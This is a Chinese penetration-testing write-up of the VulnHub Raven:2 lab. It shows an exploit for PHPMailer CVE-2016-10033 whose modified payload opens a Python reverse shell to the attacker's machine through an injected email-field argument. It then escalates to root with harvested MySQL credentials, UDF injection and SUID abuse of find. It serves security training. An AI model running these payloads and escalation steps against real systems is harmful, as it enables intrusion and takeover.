---
title: "vulnhub-Raven2靶场笔记"
date: 2025-12-11T00:00:00+08:00
draft: false

---

# vulnhub-Raven:2 渗透记录

本次渗透测试靶机为vulnhub的Raven:2，目的是学习了UDF提权后，进行的实操巩固

靶场共有4个flag

### 信息搜集（flag1）

首先nmap扫描一下eth0网卡的c端找到靶机IP：

~~~shell
nmap -sP -sn 192.168.111.1/24
~~~

发现靶机IP为`192.168.111.141`:

![image-20240707204705771](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240707204705586-1933081202.png)

对其进行端口扫描：

~~~ shell
nmap -sV -A -T4 192.168.111.141
~~~

可以发现靶机开放了22、80、111三个端口：

![image-20240707204917741](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240707204917092-133412301.png)

访问80端口发现是个网页：

![image-20240707210513704](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240707210513715-1427701984.png)

考虑用dirsearch扫一下目录：

~~~shell
dirsearch -u http://192.168.111.141/
~~~

![image-20240707210926460](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240707210925954-282366400.png)

发现有几个可访问的路径，尝试访问：

* 访问/.DS_Store可以下载该文件，访问文件可以知道web目录里面所有文件的清单

* /vendor/路由存在目录遍历：

  ![image-20240707211325102](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240707211324767-142122317.png)

  访问其中的PATH文件拿到了第一个flag：

  ~~~flag
  flag1{a2c1f66d2b8051bd3a5874b5b6e43e21}
  ~~~

通过刚才目录遍历的文件名，可知网站应该是安装了PHPmailer，而遍历到的version文件中写了5.2.16，猜测这可能就是PHPmailer版本号

在kali中搜索对应漏洞：

~~~shell
searchsploit phpmailer
~~~

![image-20240707212546170](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240707212545532-1390688819.png)

这里选择能RCE的`php/webapps/40974.py`，查看下exp：

~~~shell
searchsploit -x exploits/php/webapps/40974.py
~~~

在exploit-db上查询可知该漏洞的编号为CVE-2016-10033，是因为邮件地址能够包含用引号括起来的空格，这样可以进行攻击参数的注入

而我们通过dirsearch或网站主页上看到的邮件页面地址为：http://192.168.61.135/contact.php，因此可以尝试漏洞利用

### 漏洞利用（flag2、flag3）

接下来我们把EXP下载到桌面进行编辑：

~~~shell
searchsploit -m exploits/php/webapps/40974.py
~~~

![image-20240707213806629](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240707213806026-1547162925.png)

修改内容如下：

* 开头加上：

  ~~~python
  #!/usr/bin/python
  # -*- coding: utf-8 -*-
  ~~~

* target值改为`http://192.168.111.141/contact.php`

* backdoor值改为`houmen.php`（默认的名字容易被ban）

* 修改payload和fields：

  ~~~python
  payload = '<?php system(\'python -c """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\'[kali的IP]\\\',[监听的端口]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])"""\'); ?>'
  fields={'action': 'submit',
          'name': payload,
          'email': '"anarcoder\\\" -OQueueDirectory=/tmp -X/[web路径]/[后门文件名称].php server\" @protonmail.com',
          'message': 'Pwned'}
  ~~~

  ![image-20240707220419388](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240707220418904-1313089723.png)

接下来使用python2运行exp，然后监听端口：

![image-20240707220555704](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240707220555163-783023685.png)

然后访问`http://192.168.111.141/contact.php`，这样就会执行我们的payload在目录下面生成houmen.php

然后再访问`http://192.168.111.141/houmen.php`，即可执行反弹shell的后门，成功getshell：

![image-20240707221037315](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240707221036877-916619276.png)

用python获取一个pty：

~~~shell
python -c 'import pty; pty.spawn("/bin/bash")'
~~~

<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240707221603586-1244650144.png" alt="image-20240707221604141" style="zoom:150%;" />

接下来就是寻找flag了：

~~~shell
find / -name "flag*"
~~~

<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240707221810471-1295100024.png" alt="image-20240707221811161" style="zoom:150%;" />

成功找到flag2、flag3：

<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240707221954037-2010497582.png" alt="image-20240707221954790" style="zoom:150%;" />

![image-20240707222150048](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240707222149607-1010082816.png)

### 权限提升（flag4）

还剩个flag4没有找到，考虑可能在/root这种需要root权限的目录里，所以接下来的任务就是提权了

#### 系统下的信息搜集

可以先向主机上传一个LinEnum.sh进行信息收集，方便我们提权

![image-20240707224334417](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240707224333761-40674222.png)

对其增加执行权限并运行：

<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240707225203891-337914326.png" alt="image-20240707225204076" style="zoom:150%;" />

可以在结果中发现mysql是使用root权限运行的

![image-20240707225024853](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240707225024308-877962573.png)

因此，我们尝试进行udf提权

首先需要连接数据库的账号和密码，我们在web目录下搜索一下：

~~~shell
find . -name "*.php" -print0 | xargs -0 grep -i -n "pass"
#在当前目录及其子目录中查找扩展名为.php的文件，并搜索列出文件中包含字符串“pass”的行
~~~

在web目录下的/wordpress/wp-config.php中发现密码：

![](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240708172837131-429972598.png)

cat一下这个文件，发现是root用户密码：

<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240708170603529-898814139.png" alt="image-20240708170603027" style="zoom:150%;" />

至此，可以正式开始udf提权了

#### udf提权

首先以搜集到的账号密码登录mysql：

![image-20240708173513524](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240708173513821-1785668069.png)

可以看见服务版本为5.5.60

查看secure-file-priv，发现无目录限制，可以进行任何地方的文件导入：

<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240708174041263-994199676.png" alt="image-20240708174040653" style="zoom:150%;" />

查看plugin目录，发现目录存在，为`/usr/lib/mysql/plugin/`：

<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240708174233460-1770492901.png" alt="image-20240708174233746" style="zoom:150%;" />

在kali的sqlmap中获取udf文件：

~~~shell
python  /usr/share/sqlmap/extra/cloak/cloak.py -d -i  /usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_  -o lib_mysqludf_sys.so
~~~

再在靶机上使用wget下载udf文件到/tmp目录：

![image-20240708190156103](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240708190156229-336833578.png)

接下来就是使用我们上传的udf文件了，按流程走即可：

* 创建一张临时表用来存放DLL/SO文件的十六进制内容

  ~~~mysql
  CREATE TABLE temp_udf(udf blob);
  ~~~

* 将udf文件内容插入临时表中：

  ~~~mysql
  insert into temp_udf values(load_file('/tmp/lib_mysqludf_sys.so'));
  ~~~

* 将udf文件导出至对应位置：

  ~~~mysql
  SELECT * FROM temp_udf INTO DUMPFILE "/usr/lib/mysql/plugin/udf.so";
  ~~~

* 引入自定义函数：

  ~~~mysql
  CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';
  ~~~

* 查看是否添加成功：

  ~~~mysql
  select * from mysql.func;
  ~~~

* 执行命令：

  ~~~mysql
  select sys_eval('whoami');
  ~~~

非常顺利的拿到了root权限：

![image-20240708192051620](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240708192051954-1845768831.png)

但是一直在mysql中执行命令并不太方便，所以我们可以继续利用find进行suid提权：

* 给find命令赋予一个suid权限：

  ~~~mysql
  select sys_eval('chmod u+s /usr/bin/find');
  ~~~

* 查看一下具有suid权限的命令，判断是否成功：

  ~~~shell
  find / -perm -u=s -type f 2>/dev/null
  ~~~

成功给find添加suid权限：

![image-20240708192939300](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240708192939493-237740223.png)

接下来利用find进行suid提权即可：

~~~shell
find lib_mysqludf_sys.so -exec "/bin/sh" \;
~~~

成功提权：

<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240708193620190-2141470800.png" alt="image-20240708193619942" style="zoom:150%;" />

接下来在访问`/root`发现flag4：

<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240708193743681-224942313.png" alt="image-20240708193743957" style="zoom:150%;" />

### 总结

回顾整个渗透过程，我们遇到了以下漏洞或利用点：

* /.DS_Store文件泄露
* 目录遍历
* PHPmailer的命令执行（CVE-2016-10033）
* wp-config泄露mysql账号密码
* mysql配置不当（以root权限运行）
* mysql导入文件无目录限制

据此，我们进行了如下利用：

* 浏览可遍历的目录
* 使用反弹式webshell攻击PHPmailer
* 通过信息收集以root用户身份登录mysql
* udf提权
* 利用find命令进行suid提权